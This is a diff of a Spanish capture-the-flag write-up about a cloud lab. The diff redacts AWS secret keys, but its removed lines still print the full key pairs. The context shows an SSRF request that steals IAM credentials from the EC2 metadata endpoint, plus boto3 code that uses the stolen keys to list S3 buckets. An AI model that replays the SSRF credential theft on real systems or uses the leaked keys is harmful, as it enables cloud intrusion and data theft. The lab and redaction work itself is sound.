@@ -74,7 +74,7 @@ curl "http://23.21.237.126/?url=http://169.254.169.254/latest/meta-data/iam/secu
 ```json
 {
   "AccessKeyId": "ASIA5HCACCPUPSHC5LM7",
-  "SecretAccessKey": "RsKWfUn+3cJg63pjXyUX914vRatKmKpNTAUE0yOU",
+  "SecretAccessKey": "SECRET_REDACTED_BY_ANTIGRAVITY",
   "Token": "IQoJb3JpZ2luX2VjEMb//...[token largo]"
 }
 ```
@@ -104,7 +104,7 @@ import boto3
 s3 = boto3.client(
     's3',
     aws_access_key_id='ASIA5HCACCPUPSHC5LM7',
-    aws_secret_access_key='RsKWfUn+3cJg63pjXyUX914vRatKmKpNTAUE0yOU',
+    aws_secret_access_key='SECRET_REDACTED_BY_ANTIGRAVITY',
     aws_session_token='IQoJb3JpZ2luX2VjEMb//...'
 )
 
@@ -127,13 +127,13 @@ Descargué los archivos CSV que contenían credenciales AWS:
 **carlos.cardenas.csv:**
 ```csv
 User Name,Access Key Id,Secret Access Key
-carlos.cardenas,AKIA5HCACCPUM5JVDROJ,nCcHPOtDk4j5DFnOqzqEy64UYuupX4tWCselUUZF
+carlos.cardenas,AKIA_REDACTED_BY_ANTIGRAVITY,SECRET_REDACTED_BY_ANTIGRAVITY
 ```
 
 **daniel.lopez/aws-credentials.csv:**
 ```csv
 User Name,Access Key Id,Secret Access Key
-daniel.lopez,AKIA5HCACCPUMNRPJAMJ,2UvVFwdGhpJ+wSirma7re1HQRmNamTQlM5nI92ee
+daniel.lopez,AKIA_REDACTED_BY_ANTIGRAVITY,SECRET_REDACTED_BY_ANTIGRAVITY
 ```
 
 ---
@@ -149,8 +149,8 @@ Probé las credenciales de ambos empleados:
 ```python
 s3_daniel = boto3.client(
     's3',
-    aws_access_key_id='AKIA5HCACCPUMNRPJAMJ',
-    aws_secret_access_key='2UvVFwdGhpJ+wSirma7re1HQRmNamTQlM5nI92ee'
+    aws_access_key_id='AKIA_REDACTED_BY_ANTIGRAVITY',
+    aws_secret_access_key='SECRET_REDACTED_BY_ANTIGRAVITY'
 )
 
 # Listar todos los buckets
@@ -250,7 +250,7 @@ CTF{m3d1cl0udx_d4t4_4n4lys1s_cr3d3nt14l_3xf1ltr4t10n}
 
 **Ubicación:** `s3://ctf-25-medicloudx-patient-data-l2808981/analytics/patient-insights/flag.txt`
 
-**Credenciales usadas:** daniel.lopez (AKIA5HCACCPUMNRPJAMJ)
+**Credenciales usadas:** daniel.lopez (AKIA_REDACTED_BY_ANTIGRAVITY)
 
 ---
 
